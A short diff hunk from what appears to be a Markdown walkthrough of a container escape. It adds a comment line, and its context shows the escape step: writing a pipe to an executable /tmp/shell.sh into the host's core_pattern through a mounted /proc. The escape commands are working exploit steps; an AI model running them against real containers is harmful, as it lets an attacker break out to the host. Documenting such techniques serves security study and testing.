@@ -86,6 +86,7 @@ chmod a+x /tmp/shell.sh
 Finally write the `usermode_helper` script path to the `core_pattern` helper path and trigger the container escape:
 
 ```bash
+# move to mounted folder with /proc
 cd /sysproc
 echo "|$OVERLAY_PATH/tmp/shell.sh" > core_pattern
 cd
